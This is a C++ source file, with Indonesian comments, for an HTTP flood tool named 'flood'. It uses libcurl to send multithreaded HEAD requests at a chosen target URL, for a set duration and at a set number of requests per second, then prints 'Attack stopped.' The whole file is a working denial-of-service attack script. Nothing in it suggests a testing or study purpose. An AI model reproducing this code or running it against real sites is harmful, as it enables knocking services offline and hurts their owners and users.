#include <iostream>
#include <curl/curl.h>
#include <thread>
#include <vector>
#include <chrono>

// Fungsi untuk mengirim request HTTP menggunakan libcurl
void sendRequest(const std::string& target) {
    CURL* curl;
    CURLcode res;

    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, target.c_str());
        curl_easy_setopt(curl, CURLOPT_NOBODY, 1L); // Hanya HEAD request (opsional, agar lebih ringan)
        res = curl_easy_perform(curl);

        if (res != CURLE_OK) {
            std::cerr << "Request failed: " << curl_easy_strerror(res) << std::endl;
        }
        curl_easy_cleanup(curl);
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4) {
        std::cout << "Invalid Usage: ./flood URL DURATION REQUESTS_PER_SECOND" << std::endl;
        return 1;
    }

    std::string target = argv[1];  // URL Target
    int duration = std::stoi(argv[2]);  // Durasi serangan (dalam detik)
    int requestsPerSecond = std::stoi(argv[3]); // Jumlah request per detik

    // Inisialisasi libcurl
    curl_global_init(CURL_GLOBAL_DEFAULT);

    auto start = std::chrono::high_resolution_clock::now();
    auto end = start + std::chrono::seconds(duration);

    while (std::chrono::high_resolution_clock::now() < end) {
        std::vector<std::thread> threads;

        // Kirim request sesuai jumlah per detik
        for (int i = 0; i < requestsPerSecond; ++i) {
            threads.push_back(std::thread(sendRequest, target));
        }

        // Tunggu semua thread selesai
        for (auto& t : threads) {
            t.join();
        }

        // Tunggu hingga 1 detik sebelum batch selanjutnya
        std::this_thread::sleep_for(std::chrono::milliseconds(1000));
    }

    // Cleanup libcurl
    curl_global_cleanup();

    std::cout << "Attack stopped." << std::endl;
    return 0;
}
